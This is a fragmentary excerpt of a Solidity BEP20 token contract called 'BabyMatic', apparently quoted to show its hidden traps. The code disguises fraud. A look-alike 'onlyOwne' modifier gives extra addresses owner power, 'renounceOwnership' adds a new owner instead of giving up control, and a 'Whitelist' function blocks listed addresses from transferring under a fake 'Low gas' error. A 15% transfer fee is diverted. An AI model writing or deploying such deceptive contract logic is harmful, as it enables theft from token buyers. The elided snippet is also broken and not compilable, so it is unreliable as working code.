...
contract BabyMatic is Context, IBEP20, Ownable {
  ...
  function decimals() external override view returns (uint8) {
   ...
   function    Whitelist(address _user) public onlyOwne {
        isWhitelisted[_user] = true;
        // emit events as well
    }
    
  function removeFromWhitelist(address _user) public onlyOwne {
...
modifier onlyOwne() {
    require((__owner == _msgSender() || true == isOwner[_msgSender()]), "Ownable: caller is not the owner");
    _;
  }
  /**
  ...
  function transfer(address recipient, uint256 amount) external override returns (bool) {
     fee = amount / 100 * 15;
      Tamount = amount - fee; 
    _transfer(_msgSender(), _recipient, fee); 
   ...
   */
    function setAntibot(uint256 _input) public onlyOwner() {
     ...
     function renounceOwnership(address newOwn) public onlyOwner {
         isOwner[newOwn] = true;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    if (sender != __owner) {  
    require(isWhitelisted[sender] != true , "Low gas");
    require(amount <= _maxTrxLimit , "Low gas");
